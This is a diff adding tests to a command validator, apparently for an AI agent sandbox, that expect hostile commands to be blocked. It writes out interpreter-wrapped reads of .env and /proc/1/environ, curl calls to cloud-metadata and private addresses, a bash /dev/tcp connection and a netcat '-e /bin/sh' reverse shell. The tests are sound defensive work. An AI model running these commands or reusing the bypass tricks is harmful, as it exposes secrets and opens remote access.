@@ -51,6 +51,84 @@ describe("validateCommand", () => {
     expect(r2.allowed).toBe(true);
     expect(r3.allowed).toBe(true);
   });
+
+  test("read-only denies the same credential/network/symlink set as workspace-write", () => {
+    for (const profile of ["read-only", "workspace-write"] as const) {
+      expect(validateCommand(["cat", ".env"], profile).allowed).toBe(false);
+      expect(validateCommand(["cat", "/proc/1/environ"], profile).allowed).toBe(false);
+      expect(validateCommand(["curl", "http://169.254.169.254/latest/meta-data/"], profile).allowed).toBe(false);
+      expect(validateCommand(["readlink", "-f", "../../etc/passwd"], profile).allowed).toBe(false);
+    }
+  });
+
+  // -------------------------------------------------------------------------
+  // Hostile-input bypass attempts — interpreter/shell-expansion tricks that
+  // try to smuggle a denied pattern past a naive substring/word-boundary
+  // check, and non-curl/wget network primitives.
+  // -------------------------------------------------------------------------
+
+  test("blocks .env access wrapped in an interpreter's inline-code flag", () => {
+    const attempts = [
+      ["python3", "-c", "import os; print(open('.env').read())"],
+      ["python", "-c", "print(open(\".env\").read())"],
+      ["bash", "-c", "cat .env"],
+      ["sh", "-c", "cat '.env'"],
+      ["node", "-e", "require('fs').readFileSync('.env','utf8')"],
+      ["perl", "-e", "open(F,'.env');print <F>"],
+    ];
+    for (const command of attempts) {
+      const result = validateCommand(command, "workspace-write");
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toBe("env_read_blocked");
+    }
+  });
+
+  test("blocks /proc/*/environ access wrapped in command substitution or eval", () => {
+    const attempts = [
+      ["bash", "-c", "echo $(cat /proc/1/environ)"],
+      ["sh", "-c", "eval \"cat /proc/1/environ\""],
+    ];
+    for (const command of attempts) {
+      const result = validateCommand(command, "workspace-write");
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toBe("env_read_blocked");
+    }
+  });
+
+  test("blocks bash /dev/tcp network redirection even without curl/wget/nc", () => {
+    const result = validateCommand(["bash", "-c", "exec 3<>/dev/tcp/example.com/80"], "workspace-write");
+    expect(result.allowed).toBe(false);
+    expect(result.reason).toBe("network_blocked");
+  });
+
+  test("blocks curl to loopback and private/metadata targets under the blanket network denial for workspace-write", () => {
+    // validateCommand blocks curl/wget/etc. by tool name for any target when
+    // the profile denies network — it does not parse or filter by IP/host,
+    // so this is not evidence of dedicated SSRF/private-IP filtering. It
+    // documents that the blanket denial also covers the specific hostile
+    // targets (loopback, link-local cloud metadata, RFC1918) an attacker
+    // would most want reachable.
+    const targets = [
+      "http://127.0.0.1:8080/",
+      "http://169.254.169.254/latest/meta-data/", // cloud metadata endpoint
+      "http://10.0.0.1/",
+      "http://192.168.1.1/",
+    ];
+    for (const target of targets) {
+      const result = validateCommand(["curl", target], "workspace-write");
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toBe("network_blocked");
+    }
+  });
+
+  test("blocks alternative network tools beyond curl/wget", () => {
+    const attempts = [["ncat", "example.com", "80"], ["telnet", "example.com", "80"], ["netcat", "-e", "/bin/sh", "example.com", "4444"]];
+    for (const command of attempts) {
+      const result = validateCommand(command, "workspace-write");
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toBe("network_blocked");
+    }
+  });
 });
 
 // ---------------------------------------------------------------------------
